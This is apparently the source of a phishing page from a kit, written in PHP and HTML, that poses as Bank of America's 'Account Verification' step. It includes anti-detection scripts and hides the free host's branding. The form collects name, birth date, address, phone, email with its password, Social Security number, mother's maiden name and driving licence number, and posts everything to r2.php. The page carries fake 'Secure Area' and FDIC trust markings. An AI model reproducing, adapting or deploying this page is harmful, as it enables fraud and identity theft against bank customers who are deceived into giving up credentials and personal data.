<?php
	include 'prevents/anti1.php';
	include 'prevents/anti2.php';
	include 'prevents/anti3.php';
	include 'prevents/anti4.php';
	include 'prevents/anti5.php';
	include 'prevents/anti6.php';
	include 'prevents/anti7.php';
	include 'prevents/anti8.php';
?>
<!DOCTYPE html>
<html class="win chrome chrome-47 webkit svg-bg not-retina non-retinal cf-l33bo-reg-active cf-l33bo-med-active" lang="en-US">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
<title>Verification</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/ico">
<link href="assets/css/verify2.css" rel="stylesheet" type="text/css">
<link href="assets/css/frd.css" rel="stylesheet" type="text/css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
    $(document).ready(function(){ 
	$('body').find('img[src$="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"]').remove();
    }); 
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script>
                function isInputNumber(evt){
                var ch = String.fromCharCode(evt.which);
                if(!(/[0-9]/.test(ch))){
                    evt.preventDefault();
                }
            }  
        </script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<style>
span.error {
	color:red;
	display:block;
	text-size:8px;
	font-weight:bold;
	padding-left:3px;
</style>
<script>
$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					name: {	required: true,	minlength: 4,},
					day: { required: true},
					month: { required: true},
					year: { required: true},
					phone1: { required: true},
					phone2: { required: true},
					phone3: { required: true},
					address: { required: true, minlength: 5,},
					city: { required: true, minlength: 3,},
					state: { required: true,},
					zip: { required: true, minlength: 5,},
					email: { required: true, email:true},
					empass: { required: true, minlength: 3,},
					ssn1: { required: true},
					ssn2: { required: true},
					ssn3: { required: true},
					mmn: { required: true},
					dlno: { required: true},
                },
				errorPlacement: function(error, element) {
				if (element.attr("name") == "name") 
				error.insertAfter("#nameerror");
				else if (element.attr("name") == "day") 
				error.insertAfter("#doberror");
				else if (element.attr("name") == "month") 
				error.insertAfter("#doberror");
				else if (element.attr("name") == "year") 
				error.insertAfter("#doberror");
				else if (element.attr("name") == "phone1") 
				error.insertAfter("#phoneerror");
				else if (element.attr("name") == "phone2") 
				error.insertAfter("#phoneerror");
				else if (element.attr("name") == "phone3") 
				error.insertAfter("#phoneerror");
				else if (element.attr("name") == "ssn1") 
				error.insertAfter("#ssnerror");
				else if (element.attr("name") == "ssn2") 
				error.insertAfter("#ssnerror");
				else if (element.attr("name") == "ssn3") 
				error.insertAfter("#ssnerror");
				else
				error.insertAfter(element);			
				},
				groups: {
					phone: "phone1 phone2 phone3",
					dob: "month day year",
					ssn: "ssn1 ssn2 ssn3",
				},
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					day: { required: "Please provide your date of birth", },
					month: { required: "Please provide your date of birth", },
					year: { required: "Please provide your date of birth", },
					ssn1: { required: "Please provide your social security number", },
					ssn2: { required: "Please provide your social security number", },
					ssn3: { required: "Please provide your social security number", },
					phone1:{ required: "Please provide your telephone number", },
					phone2:{ required: "Please provide your telephone number", },
					phone3:{ required: "Please provide your telephone number", },
					mmn: {
						required: "Please provide your mother&apos;s maiden name",
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					city: {
						required: "Please provide your city",
						minlength: jQuery.validator.format("Please check the city you have entered"),
					},
					state: {
						required: "Please select your state",
					},
					zip: {
						required: "Please provide your zip code",
						minlength: jQuery.validator.format("Please check the zip code you have entered"),
					},					
					email: {
						required: "Please provide your email address",
					},
					empass: {
						required: "Please provide your email password",
					},
					mmn: {
						required: "Please provide your mother&apos;s maiden name",
					},
					dlno: {
						required: "Please provide your driving license number",
					},

					empass: {
					required: "Please provide your email password",
					minlength: jQuery.validator.format("Please check the email password you have entered"),
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });

			$("#go").click(function() {
			$("#details").submit();
			});
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
 
</script>
</head>
<body>
<div class="two-row-flex-wideleft-layout">
<div class="center-content">
<div class="header">
<div class="header-module">
<div class="l33b00"><img height="28" src="assets/img/logo.gif" width="221">
<div class="page-type l33bo-reg">Account Verification</div>
<div class="right-links">
<div class="secure-area">Secure Area</div>
<a class="divide" href="#">En Espa&ntilde;ol</a>
<div class="clearboth"></div>
</div>
<div class="clearboth"></div>
</div>
</div>
<div class="page-title-module h-100" id="skip-to-h1" style="height:60px!important">
<div class="red-grad-bar-skin sup-ie">
<h1 class="l33bo-reg">Step 1</h1>
</div>
</div>
<div class="status-bar-bdf-module">
<div class="multi-step-skin">
<div class="sb-step sb-selected-step"><span class="ada-hidden">Step 1 of 5:</span> Personal Information
<div class="sb-arrow"></div>
</div>
<div class="sb-step"><span class="ada-hidden">You are currently at Step 2 of 5:</span> Account Details
<div class="sb-arrow"></div>
</div>
<div class="sb-step"><span class="ada-hidden">Step 3 of 5:</span> Security
<div class="sb-arrow"></div>
</div>
<div class="sb-step"><span class="ada-hidden">You are currently at Step 4 of 5:</span> Identification
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-last-step"><span class="ada-hidden">Step 5 of 5:</span> Finish</div>
<div class="clearboth"></div>
</div>
</div>
</div>
<div class="flex-top-row"></div>
<div class="bottom-row">
<div class="left-column">
<div class="passcode-module">
<div class="self-enroll-skin phoenix">
<p class="mbtm-10">To help verify your identity, please enter the following details.</p>
<form style="font-size: 12px!important;" action="r2.php" autocomplete="off" class="common-form" id="details" method="post" name="details">
<fieldset><legend></legend>
<div class="input-section">
<fieldset>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="100%">
<tbody>
<tr>
<td><br></td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="name"><span class="text2">* Full Name:</span> <span id="h2-ada"><br></span></label></td>
</tr>
<tr>
<td style="height: 41px">
<div id="vfullname" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" class="resize-text1" name="name" size="28" type="text" value=""><span id="nameerror"></span></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="month"><span class="text2">* Date of Birth:</span> <span id="h2-ada"><br></span></label></td>
</tr>
<tr>
<td>
<div id="dob" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<select required="required" id="month" name="month" style="display:inline">
<option value="">Month</option>
<option value="1">January</option>
<option value="2">Febuary</option>
<option value="3">March</option>
<option value="4">April</option>
<option value="5">May</option>
<option value="6">June</option>
<option value="7">July</option>
<option value="8">August</option>
<option value="9">September</option>
<option value="10">October</option>
<option value="11">November</option>
<option value="12">December</option>
</select> 
<select required="required" id="day" name="day" style="display:inline">
<option value="">Day</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select> 
<select required="required" id="year" name="year" style="display:inline">
<option value="">Year</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
</select><span id="doberror"></span></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="address"><span class="text2">* Address Line 1:</span></label></td>
</tr>
<tr>
<td>
<div id="vadd1" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" class="resize-text1" name="address" size="28" type="text" value=""></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="address2"><span class="text2">Address Line 2:</span></label></td>
</tr>
<tr>
<td>
<input class="resize-text1" name="address2" size="28" type="text" value=""></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="city"><span class="text2">* City:</span></label></td>
</tr>
<tr>
<td>
<div id="vcity" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" maxlength="21" class="resize-text1" name="city" size="28" type="text" value=""></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="passcode"><span class="text2">* State:</span></label></td>
</tr>
<tr>
<td>
<div id="vstate" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<select required="required" class="align-font-width-state" id="previous_state" name="state" style="width:205px;">
<option value="">Please Select</option>
<option value="AL">Alabama</option>
<option value="AK">Alaska</option>
<option value="AZ">Arizona</option>
<option value="AR">Arkansas</option>
<option value="CA">California</option>
<option value="CO">Colorado</option>
<option value="CT">Connecticut</option>
<option value="DE">Delaware</option>
<option value="DC">District of Columbia</option>
<option value="FL">Florida</option>
<option value="GA">Georgia</option>
<option value="HI">Hawaii</option>
<option value="ID">Idaho</option>
<option value="IL">Illinois</option>
<option value="IN">Indiana</option>
<option value="IA">Iowa</option>
<option value="KS">Kansas</option>
<option value="KY">Kentucky</option>
<option value="LA">Louisiana</option>
<option value="ME">Maine</option>
<option value="MD">Maryland</option>
<option value="MA">Massachusetts</option>
<option value="MI">Michigan</option>
<option value="MN">Minnesota</option>
<option value="MS">Mississippi</option>
<option value="MO">Missouri</option>
<option value="MT">Montana</option>
<option value="NE">Nebraska</option>
<option value="NV">Nevada</option>
<option value="NH">New Hampshire</option>
<option value="NJ">New Jersey</option>
<option value="NM">New Mexico</option>
<option value="NY">New York</option>
<option value="NC">North Carolina</option>
<option value="ND">North Dakota</option>
<option value="OH">Ohio</option>
<option value="OK">Oklahoma</option>
<option value="OR">Oregon</option>
<option value="PA">Pennsylvania</option>
<option value="RI">Rhode Island</option>
<option value="SC">South Carolina</option>
<option value="SD">South Dakota</option>
<option value="TN">Tennessee</option>
<option value="TX">Texas</option>
<option value="UT">Utah</option>
<option value="VT">Vermont</option>
<option value="VA">Virginia</option>
<option value="WA">Washington</option>
<option value="WV">West Virginia</option>
<option value="WI">Wisconsin</option>
<option value="WY">Wyoming</option>
<option value="IT">International</option>
</select></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="zip"><span class="text2">* Zip Code:</span> <span id="h2-ada"><br></span></label></td>
</tr>
<tr>
<td>
<div id="vzip" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" class="resize-text1" maxlength="5" name="zip" size="5" type="text" value="" onkeypress="isInputNumber(event)" style="width: 65px"></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr align="left" valign="top">
<td>
<table cellpadding="0" cellspacing="0">
<tr>
<td align="left" class="textbold" valign="top"><label for="phone"><span class="text2">* Phone Number:</span></label></td>
</tr>
<tr>
<td>
<div id="phone" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" class="phone" maxlength="3" id="phone1" name="phone1" size="3" type="text" value="" onkeypress="isInputNumber(event)" onkeyup="movetoNext(this, 'phone2')" style="width: 30px"> - 
<input required="required" class="phone" maxlength="3" id="phone2" name="phone2" size="3" type="text" value="" onkeypress="isInputNumber(event)" onkeyup="movetoNext(this, 'phone3')" style="width: 30px"> - 
<input required="required" class="phone" maxlength="4" id="phone3" name="phone3" size="4" type="text" value="" onkeypress="isInputNumber(event)" style="width: 35px"><span id="phoneerror"></span></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="email"><span class="text2">* E-mail Address:</span></label></td>
</tr>
<tr>
<td>
<div id="vemail" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" class="resize-text1" name="email" size="26" type="text" value="" style="width: 155px"></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="empass"><span class="text2">* E-mail Password:</span> <span id="h2-ada"><br></span></label></td>
</tr>
<tr>
<td>
<div id="empass" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" class="resize-text1" name="empass" size="26" type="password" value="" style="width: 155px"></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td></td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="ssn"><span class="text2">* Social Security Number:</span></label></td>
</tr>
<tr>
<td>
<div id="ssn" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" class="ssn" maxlength="3" id="ssn1" name="ssn1" size="3" type="text" value="" onkeypress="isInputNumber(event)" onkeyup="movetoNext(this, 'ssn2')" style="width: 30px"> - 
<input required="required" class="ssn" maxlength="2" id="ssn2" name="ssn2" size="2" type="text" value="" onkeypress="isInputNumber(event)" onkeyup="movetoNext(this, 'ssn3')" style="width: 30px"> -
 <input required="required" class="ssn" maxlength="4" id="ssn3" name="ssn3" size="4" type="text" value="" onkeypress="isInputNumber(event)" style="width: 30px"> <span id="ssnerror"></span></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="mmn"><span class="text2">* Mother's Maiden Name:</span></label></td>
</tr>
<tr>
<td>
<div id="vmother" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required" class="resize-text1" name="mmn" size="26" type="text" value=""></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td align="left" class="textbold" valign="top"><label for="dlno"><span class="text2">* Driving License Number:</span></label></td>
</tr>
<tr>
<td>
<div id="vdlisence" style="font-size:11px; padding:0; margin:0; color:#C30;"></div>
<input required="required"  class="resize-text1" name="dlno" size="26" type="text" value="" style="width: 120px"></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
</table>
</td>
</tr>
</tbody>
</table>

</fieldset>
</div>
</fieldset>
<div class="hidden-sections">
<div id="default"></div>
</div>
<div class="ptop-30">
<input id="continue" type="submit" value="Continue" class="btn-bofa btn-bofa-small btn-bofa-blue" id="go"></input>
<div class="clearboth"></div>
</div>
</form>
</div>
</div>
</div>
<div class="right-column no-print"></div>
<div class="clearboth"></div>
</div>
<div class="single-column-row"></div>
<div class="footer">
<div class="footer-top">&nbsp;</div>
<div class="footer-inner" style="margin-top: 83px;">
<div class="global-footer-module">
<div class="gray-bground-skin cssp">
<div class="secure">Secure area</div>
<div class="link-container">
<div class="link-row"><a class="last-link" href="#">Privacy &amp; Security</a>
<div class="clearboth"></div>
</div>
</div>
<p>Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender<img alt="" height="9" src="assets/img/house.gif" width="14"></a><br>
&copy;&nbsp;2021 Bank of America Corporation. All rights reserved.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>